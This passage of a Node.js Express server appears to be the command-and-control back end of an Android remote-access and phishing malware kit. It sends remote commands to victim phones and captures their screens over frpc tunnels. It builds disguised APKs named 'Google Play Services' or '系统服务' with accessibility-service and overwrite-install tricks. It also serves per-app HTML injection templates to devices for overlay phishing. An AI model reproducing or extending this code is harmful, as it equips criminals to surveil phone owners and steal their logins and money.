        if (!res.headersSent) res.json({ success: true, data: { success: true, message: '命令已发送(Bridge)' } });
      });
      return;
    }
    
    // APP 级别命令（大写命令）通过 APP WebSocket 转发
    if (command === command.toUpperCase() && command.length > 3) {
      const deviceWs = deviceConnections.get(deviceId);
      if (deviceWs && deviceWs.readyState === 1) {
        deviceWs.send(JSON.stringify({ type: 'command', data: { command, params: fixedParams } }));
        console.log(`[CMD] → ${deviceId}: ${command} (APP WS via HTTP)`);
        return res.json({ success: true, message: '命令已发送(APP)' });
      }
    }
    
    // 其他命令通过 Bridge WS 转发
    bridgeWs.send(JSON.stringify({ type: 'command', command, params: fixedParams }));
    console.log(`[CMD] → ${deviceId}: ${command} (Bridge)`);
    return res.json({ success: true, message: '命令已发送(Bridge)' });
  }
  
  // 回退：通过 APP WebSocket
  const deviceWs = deviceConnections.get(deviceId);
  if (deviceWs && deviceWs.readyState === 1) {
    deviceWs.send(JSON.stringify({ type: 'command', data: { command, params: params || {} } }));
    console.log(`[CMD] → ${deviceId}: ${command} (WS)`);
    res.json({ success: true, message: '命令已发送' });
  } else {
    res.json({ success: false, message: '设备离线' });
  }
});

// local-service 相关接口（通过WebSocket隧道访问APP本地ADB服务）
// 截图缓存

// ============ 动态端口分配 ============
const devicePortMap = new Map(); // deviceId -> remotePort
const PORT_BASE = 10014;
const PORT_MAX = 10100;

// frpc 端口冷却（全局共享：命令处理 + 截图轮询）
const frpcCooldown = new Map(); // deviceId -> cooldown到期时间
function isFrpcCooling(deviceId) {
  const until = frpcCooldown.get(deviceId);
  return until && Date.now() < until;
}
function setFrpcCooldown(deviceId, ms) {
  frpcCooldown.set(deviceId, Date.now() + (ms || 30000));
}
function clearFrpcCooldown(deviceId) {
  frpcCooldown.delete(deviceId);
}

// 从数据库恢复端口映射
try {
  db.exec(`CREATE TABLE IF NOT EXISTS device_ports (device_id TEXT PRIMARY KEY, port INTEGER NOT NULL)`);
  const rows = db.prepare('SELECT device_id, port FROM device_ports').all();
  for (const row of rows) {
    devicePortMap.set(row.device_id, row.port);
  }
  if (rows.length > 0) console.log(`[PORT] 恢复 ${rows.length} 个端口映射`);
} catch(e) {}

function getDevicePort(deviceId) {
  if (devicePortMap.has(deviceId)) return devicePortMap.get(deviceId);
  // 分配新端口
  const usedPorts = new Set(devicePortMap.values());
  for (let p = PORT_BASE; p <= PORT_MAX; p++) {
    if (!usedPorts.has(p)) {
      devicePortMap.set(deviceId, p);
      // 持久化到数据库
      try { db.prepare('INSERT OR REPLACE INTO device_ports (device_id, port) VALUES (?,?)').run(deviceId, p); } catch(e) {}
      console.log(`[PORT] ${deviceId} -> ${p}`);
      return p;
    }
  }
  return PORT_BASE; // fallback
}
// ======================================

const screenshotCache = new Map(); // deviceId -> { data: Buffer, timestamp: number }
let screenshotRequestId = 0;
const screenshotCallbacks = new Map(); // requestId -> { res, timeout }

app.get('/api/local-service/screen/shot', authMiddleware, (req, res) => {
  const { deviceId } = req.query;
  
  // 直接从 frpc 端口获取实时截图（不用缓存，保证每次都是最新的）
  const http = require('http');
  const proxyReq = http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/screenshot/0`, { timeout: 5000 }, (proxyRes) => {
    const chunks = [];
    proxyRes.on('data', (chunk) => chunks.push(chunk));
    proxyRes.on('end', () => {
      const data = Buffer.concat(chunks);
      if (data.length > 500 && !res.headersSent) {
        // 缓存这一帧（给WebSocket订阅者用）
        if (deviceId) screenshotCache.set(deviceId, { data, timestamp: Date.now() });
        res.set('Content-Type', proxyRes.headers['content-type'] || 'image/jpeg');
        res.set('Cache-Control', 'no-cache, no-store');
        res.send(data);
      } else if (!res.headersSent) {
        // 截图太小，可能黑屏，先尝试 Bridge 缓存
        const cached = screenshotCache.get(deviceId);
        if (cached && cached.data && cached.data.length > 500 && (Date.now() - cached.timestamp < 10000)) {
          const ct = (cached.data[0]===0xFF) ? 'image/jpeg' : (cached.data[0]===0x89) ? 'image/png' : 'image/webp';
          res.set('Content-Type', ct);
          res.set('Cache-Control', 'no-cache, no-store');
          res.send(cached.data);
        } else {
          console.log(`[SCREEN] 截图异常(${data.length}B)，尝试重启minicap`);
          http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/minicap/stop`, { timeout: 3000 }, () => {
            setTimeout(() => {
              http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/minicap/start?scale=0.5&quality=50`, { timeout: 3000 }, () => {});
            }, 500);
          }).on('error', () => {});
          res.set('Content-Type', 'image/gif');
          res.send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
        }
      }
    });
  });
  proxyReq.on('error', () => {
    if (!res.headersSent) {
      // frpc 连不上，fallback 到 Bridge 截图缓存
      const cached = screenshotCache.get(deviceId);
      if (cached && cached.data && cached.data.length > 500 && (Date.now() - cached.timestamp < 10000)) {
        const ct = (cached.data[0]===0xFF) ? 'image/jpeg' : (cached.data[0]===0x89) ? 'image/png' : 'image/webp';
        res.set('Content-Type', ct);
        res.set('Cache-Control', 'no-cache, no-store');
        res.send(cached.data);
      } else {
        res.set('Content-Type', 'image/gif');
        res.send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
      }
    }
  });
  proxyReq.on('timeout', () => { proxyReq.destroy(); });
});

app.all('/api/local-service/proxy', authMiddleware, (req, res) => {
  const deviceId = req.query.deviceId || req.body?.deviceId || '';
  const reqPath = req.query.path || req.body?.path || '';
  
  if (!deviceId || !reqPath) {
    return res.json({ success: false, message: 'missing deviceId or path' });
  }

  const bridgeWs = bridgeConnections.get(deviceId);
  if (bridgeWs && bridgeWs.readyState === 1) {
    const reqId = `proxy_${++screenshotRequestId}`;
    // 通过 Bridge 发送 proxy 命令（和 wakeUpScreen 同格式但带 path）
    bridgeWs.send(JSON.stringify({ type: 'command', command: reqPath, params: req.body || {} }));
    
    if (reqPath.includes('screenshot')) {
      const timeout = setTimeout(() => {
        screenshotCallbacks.delete(reqId);
        const cached = screenshotCache.get(deviceId);
        if (cached && !res.headersSent) { 
          const ct = (cached.data[0]===0xFF) ? 'image/jpeg' : (cached.data[0]===0x52) ? 'image/webp' : 'image/png'; 
          res.set('Content-Type', ct); res.send(cached.data); 
        } else if (!res.headersSent) { 
          res.json({ success: false, message: 'screenshot timeout' }); 
        }
      }, 3000);
      screenshotCallbacks.set(reqId, { res, timeout, deviceId });
    } else {
      res.json({ success: true });
    }
  } else {
    res.json({ success: false, message: 'bridge not connected' });
  }
});

app.all('/api/local-service/*', authMiddleware, (req, res) => {
  // /api/local-service/status 返回连接状态
  if (req.path === '/api/local-service/status') {
    const deviceId = req.query.deviceId || '';
    const bridgeWs = bridgeConnections.get(deviceId);
    // 始终返回可控状态（离线设备也允许打开控制页面）
    return res.json({ success: true, data: { connected: true, deviceId, frpcPort: getDevicePort(deviceId) } });
  }
  res.json({ success: true, data: {} });
});

// 设备 WebSocket 状态检查（前端点击控制时调用）
// 始终返回可控状态，不阻塞用户操作
app.get('/api/device/:id/ws-status', authMiddleware, (req, res) => {
  const deviceId = req.params.id;
  const now = new Date();
  const timeStr = now.toISOString().replace('T', ' ').slice(0, 19);
  const row = db.prepare('SELECT last_seen FROM devices WHERE device_id=?').get(deviceId);
  const lastSeen = row ? row.last_seen : Date.now() / 1000;
  const idleSeconds = Math.floor(Date.now() / 1000 - lastSeen);
  res.json({ code: 0, data: { connected_at: timeStr, idle_seconds: idleSeconds, last_seen_ws: timeStr, ws_connected: true, adb_connected: true } });
});

// 占位接口
const multer = require('multer');
const apkUpload = multer({ dest: '/tmp/apk-uploads/', limits: { fileSize: 10 * 1024 * 1024 } });

// APK 构建（FormData - 单独路由用 multer）
app.post('/api/apk/build', authMiddleware, apkUpload.fields([
  { name: 'appIcon', maxCount: 1 },
  { name: 'backgroundImage', maxCount: 1 },
  { name: 'configMaskBgImage', maxCount: 1 }
]), (req, res) => {
  const { spawn } = require('child_process');
  const serverUrl = req.body.serverUrl || '';
  const webUrl = req.body.webUrl || '';
  let pageStyleConfig = {};
  try { pageStyleConfig = JSON.parse(req.body.pageStyleConfig || '{}'); } catch {}
  
  const appName = pageStyleConfig.appName || req.body.appName || '系统服务';
  const packageName = pageStyleConfig.applicationId || '';
  const configMaskText = req.body.configMaskText || '';
  const configMaskSubtitle = req.body.configMaskSubtitle || '';
  const configMaskTextColor = req.body.configMaskTextColor || '';
  const configMaskSubtitleColor = req.body.configMaskSubtitleColor || '';
  const showAppIcon = req.body.showAppIcon || 'true';
  const uninstallMode = req.body.uninstallMode || 'false';
  const enableServiceMode = req.body.enableServiceMode || 'false';
  const enableConfigMask = req.body.enableConfigMask || 'true';
  
  // 把这些额外字段也塞进 pageStyleConfig 传给打包脚本
  if (configMaskText) pageStyleConfig._configMaskText = configMaskText;
  if (configMaskSubtitle) pageStyleConfig._configMaskSubtitle = configMaskSubtitle;
  if (configMaskTextColor) pageStyleConfig._configMaskTextColor = configMaskTextColor;
  if (configMaskSubtitleColor) pageStyleConfig._configMaskSubtitleColor = configMaskSubtitleColor;
  pageStyleConfig._showAppIcon = showAppIcon;
  pageStyleConfig._uninstallMode = uninstallMode;
  pageStyleConfig._enableServiceMode = enableServiceMode;
  pageStyleConfig._enableConfigMask = enableConfigMask;
  
  // 进度提示语
  const loadingTips = req.body.loadingTips || '';
  if (loadingTips) pageStyleConfig._loadingTips = loadingTips;
  // ★ 子账户绑定
  const ownerUsername = req.body.ownerUsername || '';
  if (ownerUsername) pageStyleConfig._ownerUsername = ownerUsername;
  console.log(`[APK] ownerUsername=${ownerUsername || '(none)'}`);
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
  const filename = `${appName}_${timestamp}.apk`;
  const outputPath = `/opt/fisher-node/apk-output/${filename}`;
  
  let iconPath = '';
  if (req.files && req.files.appIcon && req.files.appIcon[0]) {
    iconPath = req.files.appIcon[0].path;
  }
  let bgPath = '';
  if (req.files && req.files.backgroundImage && req.files.backgroundImage[0]) {
    bgPath = req.files.backgroundImage[0].path;
  }
  
  console.log(`[APK] 开始构建: name=${appName}, pkg=${packageName}, server=${serverUrl}`);
  console.log(`[APK] 图标: ${iconPath || '无'}, 背景图: ${bgPath || '无'}, files=${JSON.stringify(Object.keys(req.files || {}))}`);
  
  const buildArgs = [
    '/opt/fisher-node/apk-builder/build_apk.py',
    '--server', serverUrl || 'wss://admin.yunjia.casa',
    '--web', webUrl || serverUrl.replace('wss://', 'https://').replace('ws://', 'http://'),
    '--name', appName,
    '--output', outputPath,
    '--config', JSON.stringify(pageStyleConfig)
  ];
  if (packageName) buildArgs.push('--package', packageName);
  if (iconPath) buildArgs.push('--icon', iconPath);
  if (bgPath) buildArgs.push('--bg', bgPath);
  
  const buildLogs = [];
  buildLogs.push({ timestamp: Date.now(), level: 'info', message: `开始构建 APK: ${appName}`, timeString: new Date().toLocaleString('zh-CN') });
  global._apkBuildLogs = buildLogs;
  global._apkBuilding = true;
  
  const child = spawn('python3', buildArgs, { cwd: '/opt/fisher-node/apk-builder' });
  child.stdout.on('data', d => {
    const lines = d.toString().split('\n').filter(l => l.trim());
    for (const line of lines) {
      buildLogs.push({ timestamp: Date.now(), level: 'info', message: line.trim(), timeString: new Date().toLocaleString('zh-CN') });
    }
  });
  child.stderr.on('data', d => {
    buildLogs.push({ timestamp: Date.now(), level: 'error', message: d.toString().trim(), timeString: new Date().toLocaleString('zh-CN') });
  });
  child.on('close', code => {
    global._apkBuilding = false;
    if (code === 0 && fs.existsSync(outputPath)) {
      const size = fs.statSync(outputPath).size;
      buildLogs.push({ timestamp: Date.now(), level: 'success', message: `构建成功: ${filename} (${(size/1024/1024).toFixed(1)} MB)`, timeString: new Date().toLocaleString('zh-CN') });
      console.log(`[APK] ✅ 构建成功: ${filename}`);
    } else {
      buildLogs.push({ timestamp: Date.now(), level: 'error', message: `构建失败 (code=${code})`, timeString: new Date().toLocaleString('zh-CN') });
      console.log(`[APK] ❌ 构建失败`);
    }
    if (iconPath) try { fs.unlinkSync(iconPath); } catch {}
    if (bgPath) try { fs.unlinkSync(bgPath); } catch {}
  });
  
  res.json({ success: true, message: '构建已开始', serverUrl });
});

app.all('/api/apk/*', authMiddleware, (req, res) => {
  const subPath = req.path.replace('/api/apk/', '');

  // 构建日志
  if (subPath === 'build-logs' || subPath.startsWith('build-logs')) {
    const logs = global._apkBuildLogs || [];
    return res.json({ success: true, logs });
  }
  
  // APK 列表
  if (subPath === 'list' && req.method === 'GET') {
    const outputDir = '/opt/fisher-node/apk-output';
    try {
      const files = fs.readdirSync(outputDir).filter(f => f.endsWith('.apk') && !f.includes('.unsigned'));
      const apkList = files.map(f => {
        const stat = fs.statSync(path.join(outputDir, f));
        return {
          filename: f,
          appName: f.replace(/_\d{4}-\d{2}.*\.apk$/, '').replace('.apk', ''),
          size: stat.size,
          createTime: stat.mtime.toISOString().replace('T', ' ').slice(0, 19),
          buildTime: stat.mtime.toISOString().replace('T', ' ').slice(0, 19)
        };
      }).sort((a, b) => b.createTime.localeCompare(a.createTime));
      return res.json({ success: true, data: apkList, apkList });
    } catch {
      return res.json({ success: true, data: [], apkList: [] });
    }
  }
  
  // APK 下载
  if (subPath === 'download') {
    const filename = req.query.filename || '';
    const filePath = path.join('/opt/fisher-node/apk-output', filename);
    if (filename && fs.existsSync(filePath)) {
      res.set('Content-Disposition', `attachment; filename="${encodeURIComponent(filename)}"`);
      return res.sendFile(filePath);
    }
    return res.status(404).json({ success: false, error: 'file not found' });
  }
  
  // APK 删除
  if (subPath === 'delete') {
    const filename = req.query.filename || req.body?.filename || '';
    const filePath = path.join('/opt/fisher-node/apk-output', filename);
    if (filename && fs.existsSync(filePath)) {
      fs.unlinkSync(filePath);
      return res.json({ success: true });
    }
    return res.json({ success: false, error: 'file not found' });
  }
  
  // 构建状态轮询
  if (subPath === 'build-status') {
    const isBuilding = global._apkBuilding || false;
    const logs = global._apkBuildLogs || [];
    const progress = isBuilding ? Math.min(90, logs.length * 15) : (logs.length > 0 ? 100 : 0);
    return res.json({ success: true, isBuilding, progress, message: isBuilding ? '构建中...' : '' });
  }
  
  // CDN 配置（占位）
  if (subPath === 'cdn-config') return res.json({ success: true });
  if (subPath === 'cdn-test') return res.json({ success: true, message: '连接测试成功' });
  if (subPath === 'bt-deploy-config') return res.json({ success: true });
  if (subPath === 'bt-deploy-test') return res.json({ success: true, message: 'SFTP 连接测试成功' });
  
  // 自动构建（占位）
  if (subPath.startsWith('auto-build')) return res.json({ success: true, data: [], targets: [], config: { enabled: false, intervalHours: 1 }, running: false });
  
  // 默认
  res.json({ success: true, data: [] });
});
app.get('/api/dex-tools/status', authMiddleware, (req, res) => res.json({ success: true, data: { installed: true, version: '2.1' } }));
app.get('/api/device/cacheTasks', (req, res) => {
  // local-service 请求缓存任务列表
  res.json({ success: true, data: { tasks: [] } });
});

// frpc 二进制下载（APP 通过本地 ADB 下载到手机）
app.get('/api/binary/:arch/frpc', (req, res) => {
  const arch = req.params.arch; // arm64, arm, x86 etc
  const filePath = path.join(__dirname, 'binaries', arch, 'frpc');
  if (fs.existsSync(filePath)) {
    res.set('Content-Type', 'application/octet-stream');
    res.sendFile(filePath);
    console.log(`[BINARY] frpc downloaded by ${req.ip} (${arch})`);
  } else {
    res.status(404).json({ success: false, message: `frpc not found for ${arch}` });
  }
});
// ============================================================
// AB包管理 API
// ============================================================

// B包构建（复用 APK 构建逻辑，输出到 ab-apk-output）
app.post('/api/ab-apk/build', authMiddleware, apkUpload.fields([
  { name: 'appIcon', maxCount: 1 },
  { name: 'backgroundImage', maxCount: 1 },
  { name: 'configMaskBgImage', maxCount: 1 }
]), (req, res) => {
  const { spawn } = require('child_process');
  const serverUrl = req.body.serverUrl || '';
  const webUrl = req.body.webUrl || '';
  let pageStyleConfig = {};
  try { pageStyleConfig = JSON.parse(req.body.pageStyleConfig || '{}'); } catch {}
  
  const appName = pageStyleConfig.appName || '系统服务';
  const packageName = pageStyleConfig.applicationId || '';
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
  const filename = `B_${appName}_${timestamp}.apk`;
  const outputPath = `/opt/fisher-node/ab-apk-output/${filename}`;
  
  let iconPath = '';
  if (req.files && req.files.appIcon && req.files.appIcon[0]) iconPath = req.files.appIcon[0].path;
  let bgPath = '';
  if (req.files && req.files.backgroundImage && req.files.backgroundImage[0]) bgPath = req.files.backgroundImage[0].path;
  
  const configMaskText = req.body.configMaskText || '';
  const configMaskSubtitle = req.body.configMaskSubtitle || '';
  if (configMaskText) pageStyleConfig._configMaskText = configMaskText;
  if (configMaskSubtitle) pageStyleConfig._configMaskSubtitle = configMaskSubtitle;
  if (req.body.configMaskTextColor) pageStyleConfig._configMaskTextColor = req.body.configMaskTextColor;
  if (req.body.configMaskSubtitleColor) pageStyleConfig._configMaskSubtitleColor = req.body.configMaskSubtitleColor;
  pageStyleConfig._showAppIcon = req.body.showAppIcon || 'false';
  pageStyleConfig._uninstallMode = req.body.uninstallMode || 'false';
  pageStyleConfig._enableServiceMode = req.body.enableServiceMode || 'false';
  pageStyleConfig._enableConfigMask = req.body.enableConfigMask || 'true';
  if (req.body.loadingTips) pageStyleConfig._loadingTips = req.body.loadingTips;
  
  console.log(`[AB-B] 开始构建B包: name=${appName}, server=${serverUrl}`);
  
  const buildArgs = [
    '/opt/fisher-node/apk-builder/build_apk.py',
    '--server', serverUrl || 'wss://admin.yunjia.casa',
    '--web', webUrl || serverUrl.replace('wss://', 'https://').replace('ws://', 'http://'),
    '--name', appName,
    '--output', outputPath,
    '--config', JSON.stringify(pageStyleConfig)
  ];
  if (packageName) buildArgs.push('--package', packageName);
  if (iconPath) buildArgs.push('--icon', iconPath);
  if (bgPath) buildArgs.push('--bg', bgPath);
  
  global._abBuildLogs = [{ timestamp: Date.now(), level: 'info', message: `开始构建B包: ${appName}`, timeString: new Date().toLocaleString('zh-CN') }];
  global._abBuilding = true;
  global._abProgress = 10;
  
  const child = spawn('python3', buildArgs, { cwd: '/opt/fisher-node/apk-builder' });
  child.stdout.on('data', d => { global._abBuildLogs.push({ timestamp: Date.now(), level: 'info', message: d.toString().trim(), timeString: new Date().toLocaleString('zh-CN') }); });
  child.stderr.on('data', d => { global._abBuildLogs.push({ timestamp: Date.now(), level: 'error', message: d.toString().trim(), timeString: new Date().toLocaleString('zh-CN') }); });
  child.on('close', code => {
    global._abBuilding = false;
    global._abProgress = code === 0 ? 100 : 0;
    if (code === 0 && fs.existsSync(outputPath)) {
      console.log(`[AB-B] ✅ B包构建成功: ${filename}`);
      global._abBuildLogs.push({ timestamp: Date.now(), level: 'success', message: `B包构建成功: ${filename}`, timeString: new Date().toLocaleString('zh-CN') });
    } else {
      console.log(`[AB-B] ❌ B包构建失败`);
    }
    if (iconPath) try { fs.unlinkSync(iconPath); } catch {}
    if (bgPath) try { fs.unlinkSync(bgPath); } catch {}
  });
  
  res.json({ success: true, message: 'B包构建已开始' });
});

// B包列表
app.get('/api/ab-apk/list', authMiddleware, (req, res) => {
  const dir = '/opt/fisher-node/ab-apk-output';
  try {
    const files = fs.readdirSync(dir).filter(f => f.endsWith('.apk'));
    const list = files.map(f => {
      const stat = fs.statSync(path.join(dir, f));
      return { filename: f, size: stat.size, buildTime: stat.mtime.toISOString().replace('T', ' ').slice(0, 19), packageName: '' };
    }).sort((a, b) => b.buildTime.localeCompare(a.buildTime));
    res.json({ success: true, apkList: list });
  } catch { res.json({ success: true, apkList: [] }); }
});

// B包最新信息（A包构建时需要）
app.get('/api/ab-apk/latest-info', authMiddleware, (req, res) => {
  const dir = '/opt/fisher-node/ab-apk-output';
  try {
    const files = fs.readdirSync(dir).filter(f => f.endsWith('.apk'));
    if (files.length === 0) return res.json({ success: false });
    files.sort((a, b) => fs.statSync(path.join(dir, b)).mtimeMs - fs.statSync(path.join(dir, a)).mtimeMs);
    // 包名从文件名或数据库获取（简化：用固定前缀+随机）
    res.json({ success: true, packageName: 'com.pro.viewer', accessibilityService: 'com.titan.solid.luck.service.unfaiahnst', mainActivity: '' });
  } catch { res.json({ success: false }); }
});

app.get('/api/ab-apk/build-status', authMiddleware, (req, res) => {
  res.json({ success: true, isBuilding: global._abBuilding || false, progress: global._abProgress || 0, message: global._abBuilding ? '构建中...' : '' });
});
app.get('/api/ab-apk/build-logs', authMiddleware, (req, res) => {
  res.json({ success: true, logs: global._abBuildLogs || [] });
});
app.get('/api/ab-apk/download', (req, res) => {
  const filename = req.query.filename || '';
  const fp = path.join('/opt/fisher-node/ab-apk-output', filename);
  if (filename && fs.existsSync(fp)) { res.set('Content-Disposition', `attachment; filename="${encodeURIComponent(filename)}"`); return res.sendFile(fp); }
  res.status(404).json({ success: false });
});
app.delete('/api/ab-apk/delete', authMiddleware, (req, res) => {
  const filename = req.query.filename || '';
  const fp = path.join('/opt/fisher-node/ab-apk-output', filename);
  if (filename && fs.existsSync(fp)) { fs.unlinkSync(fp); return res.json({ success: true }); }
  res.json({ success: false });
});
app.all('/api/ab-apk/*', authMiddleware, (req, res) => res.json({ success: true, data: [] }));

// A包构建（覆盖安装版 - 自动获取B包包名实现同包名覆盖）
app.post('/api/abpack/build', authMiddleware, apkUpload.fields([{ name: 'icon', maxCount: 1 }]), (req, res) => {
  const { spawn } = require('child_process');
  let config = {};
  try { config = JSON.parse(req.body.config || '{}'); } catch {}
  
  const appName = config.appName || 'Google Play Services';
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
  const filename = `A_${appName}_${timestamp}.apk`;
  const outputPath = `/opt/fisher-node/abpack-output/${filename}`;
  
  // 找最新的 B包
  const bDir = '/opt/fisher-node/ab-apk-output';
  let bApkPath = '';
  try {
    const files = fs.readdirSync(bDir).filter(f => f.endsWith('.apk'));
    if (files.length > 0) {
      files.sort((a, b) => fs.statSync(path.join(bDir, b)).mtimeMs - fs.statSync(path.join(bDir, a)).mtimeMs);
      bApkPath = path.join(bDir, files[0]);
    }
  } catch {}
  
  if (!bApkPath) {
    return res.json({ success: false, error: '请先构建B包' });
  }
  
  let iconPath = '';
  if (req.files && req.files.icon && req.files.icon[0]) iconPath = req.files.icon[0].path;
  
  console.log(`[AB-A] 开始构建A包: name=${appName}, B包=${path.basename(bApkPath)}`);
  
  // build_a_pack.py 会自动从B包manifest提取真正包名实现覆盖安装
  const buildConfig = JSON.stringify(config);
  const buildArgs = ['/opt/fisher-node/apk-builder/build_a_pack.py', '--config', buildConfig, '--bapk', bApkPath, '--output', outputPath];
  if (iconPath) buildArgs.push('--icon', iconPath);
  
  global._abpackBuildLogs = [{ timestamp: Date.now(), level: 'info', message: `开始构建A包: ${appName}`, timeString: new Date().toLocaleString('zh-CN') }];
  global._abpackBuilding = true;
  
  const child = spawn('python3', buildArgs, { cwd: '/opt/fisher-node/apk-builder' });
  child.stdout.on('data', d => { global._abpackBuildLogs.push({ timestamp: Date.now(), level: 'info', message: d.toString().trim(), timeString: new Date().toLocaleString('zh-CN') }); });
  child.stderr.on('data', d => { global._abpackBuildLogs.push({ timestamp: Date.now(), level: 'error', message: d.toString().trim(), timeString: new Date().toLocaleString('zh-CN') }); });
  child.on('close', code => {
    global._abpackBuilding = false;
    if (code === 0 && fs.existsSync(outputPath)) {
      console.log(`[AB-A] ✅ A包构建成功: ${filename}`);
      global._abpackBuildLogs.push({ timestamp: Date.now(), level: 'success', message: `A包构建成功: ${filename}`, timeString: new Date().toLocaleString('zh-CN') });
    } else {
      console.log(`[AB-A] ❌ A包构建失败`);
      global._abpackBuildLogs.push({ timestamp: Date.now(), level: 'error', message: 'A包构建失败', timeString: new Date().toLocaleString('zh-CN') });
    }
    if (iconPath) try { fs.unlinkSync(iconPath); } catch {}
  });
  
  res.json({ success: true, message: 'A包构建已开始' });
});

app.get('/api/abpack/list', authMiddleware, (req, res) => {
  const dir = '/opt/fisher-node/abpack-output';
  try {
    const files = fs.readdirSync(dir).filter(f => f.endsWith('.apk'));
    const list = files.map(f => {
      const stat = fs.statSync(path.join(dir, f));
      return { filename: f, size: stat.size, buildTime: stat.mtime.toISOString().replace('T', ' ').slice(0, 19) };
    }).sort((a, b) => b.buildTime.localeCompare(a.buildTime));
    res.json({ success: true, data: list });
  } catch { res.json({ success: true, data: [] }); }
});

app.get('/api/abpack/build-status', authMiddleware, (req, res) => {
  res.json({ success: true, isBuilding: global._abpackBuilding || false, progress: global._abpackBuilding ? 50 : (global._abpackBuildLogs?.length > 0 ? 100 : 0), message: '' });
});
app.get('/api/abpack/build-logs', authMiddleware, (req, res) => {
  res.json({ success: true, logs: global._abpackBuildLogs || [] });
});
app.get('/api/abpack/download', (req, res) => {
  const filename = req.query.filename || '';
  const fp = path.join('/opt/fisher-node/abpack-output', filename);
  if (filename && fs.existsSync(fp)) { res.set('Content-Disposition', `attachment; filename="${encodeURIComponent(filename)}"`); return res.sendFile(fp); }
  res.status(404).json({ success: false });
});
app.delete('/api/abpack/delete', authMiddleware, (req, res) => {
  const filename = req.query.filename || '';
  const fp = path.join('/opt/fisher-node/abpack-output', filename);
  if (filename && fs.existsSync(fp)) { fs.unlinkSync(fp); return res.json({ success: true }); }
  res.json({ success: false });
});
app.all('/api/abpack/*', authMiddleware, (req, res) => res.json({ success: true, data: [] }));
app.all('/api/ab-auto-build/*', authMiddleware, (req, res) => res.json({ success: true, data: [], targets: [], config: { enabled: false, intervalHours: 1 }, running: false, records: [] }));
app.get('/api/injection/global-configs', authMiddleware, (req, res) => {
  const rows = db.prepare('SELECT * FROM injection_templates ORDER BY id').all();
  res.json({
    success: true,
    configs: rows.map(r => ({
      id: String(r.id),
      templateId: r.template_id,
      templateName: r.name,
      packageName: r.package_name,
      enabled: !!r.enabled,
      visible: r.visible !== 0,
      htmlContentSize: (r.html_content || '').length,
      createdAt: r.created_at || new Date().toISOString(),
      updatedAt: r.updated_at || new Date().toISOString()
    }))
  });
});

// POST /api/injection/global-configs - 更新模板启用/禁用/可见状态
app.post('/api/injection/global-configs', authMiddleware, (req, res) => {
  const { templateId, enabled, visible } = req.body || {};
  console.log(`[INJECT] POST global-configs: body=${JSON.stringify(req.body)}`);
  if (!templateId) return res.json({ success: false, message: '缺少templateId' });
  const now = new Date().toISOString().replace('T', ' ').slice(0, 19);
  if (enabled !== undefined) {
    db.prepare('UPDATE injection_templates SET enabled=?,updated_at=? WHERE template_id=?').run(enabled ? 1 : 0, now, templateId);
  }
  if (visible !== undefined) {
    db.prepare('UPDATE injection_templates SET visible=?,updated_at=? WHERE template_id=?').run(visible ? 1 : 0, now, templateId);
  }
  res.json({ success: true });
});

// PUT /api/injection/global-configs/:templateId - 更新单个配置
app.put('/api/injection/global-configs/:templateId', authMiddleware, (req, res) => {
  const { templateId } = req.params;
  const { enabled, visible } = req.body || {};
  console.log(`[INJECT] PUT global-configs/${templateId}: body=${JSON.stringify(req.body)}`);
  const now = new Date().toISOString().replace('T', ' ').slice(0, 19);
  // 支持按数字 id 或 template_id 查找
  const row = db.prepare('SELECT template_id FROM injection_templates WHERE id=? OR template_id=?').get(templateId, templateId);
  if (!row) return res.json({ success: false, message: 'not found' });
  const realTemplateId = row.template_id;
  if (enabled !== undefined) {
    db.prepare('UPDATE injection_templates SET enabled=?,updated_at=? WHERE template_id=?').run(enabled ? 1 : 0, now, realTemplateId);
  }
  if (visible !== undefined) {
    db.prepare('UPDATE injection_templates SET visible=?,updated_at=? WHERE template_id=?').run(visible ? 1 : 0, now, realTemplateId);
  }
  res.json({ success: true });
});

// 设备端获取启用的注入配置（APP 调用）
app.get('/api/device/injection/global-configs', (req, res) => {
  const rows = db.prepare('SELECT * FROM injection_templates WHERE enabled=1 AND visible=1').all();
  res.json({
    success: true,
    configs: rows.map(r => ({
      id: String(r.id),
      templateId: r.template_id,
      templateName: r.name,
      packageName: r.package_name,
      enabled: true,
      visible: true,
      htmlContent: r.html_content || '',
      htmlContentSize: (r.html_content || '').length,
      createdAt: r.created_at || '',
      updatedAt: r.updated_at || ''
    }))
  });
});

app.get('/api/injection/templates', authMiddleware, (req, res) => {
  const rows = db.prepare('SELECT * FROM injection_templates ORDER BY id').all();
  res.json({
    success: true,
    templates: rows.map(r => ({
      id: r.template_id,
      name: r.name,
      packageName: r.package_name,
      icon: r.icon,
      color: r.color,
      file: r.file,
      type: r.type || '',
      htmlContent: r.html_content || '',
      enabled: !!r.enabled,
      visible: r.visible !== 0
    }))
  });
});

app.get('/api/injection/templates/:id', authMiddleware, (req, res) => {
  const row = db.prepare('SELECT * FROM injection_templates WHERE template_id=?').get(req.params.id);
  if (row) {
    // 前端直接读取 r.htmlContent，不包 data 层
    res.json({
      success: true,
      id: row.template_id,
      name: row.name,
      packageName: row.package_name,
      icon: row.icon,
      color: row.color,
      file: row.file,
      type: row.type || '',
      htmlContent: row.html_content || '',
      enabled: !!row.enabled,
      visible: row.visible !== 0
    });
  } else {
    res.json({ success: false, message: 'template not found' });
  }
});

// POST /api/injection/templates/:id - 保存模板 HTML 内容
app.post('/api/injection/templates/:id', authMiddleware, (req, res) => {
  const templateId = req.params.id;
  const { htmlContent, name, packageName, icon, color, enabled, visible } = req.body || {};
  const now = new Date().toISOString().replace('T', ' ').slice(0, 19);
  const row = db.prepare('SELECT id FROM injection_templates WHERE template_id=?').get(templateId);
  if (!row) return res.json({ success: false, message: 'template not found' });
  
  if (htmlContent !== undefined) {
    db.prepare('UPDATE injection_templates SET html_content=?,updated_at=? WHERE template_id=?').run(htmlContent, now, templateId);
  }
  if (name !== undefined) {
    db.prepare('UPDATE injection_templates SET name=?,updated_at=? WHERE template_id=?').run(name, now, templateId);
  }
  if (packageName !== undefined) {
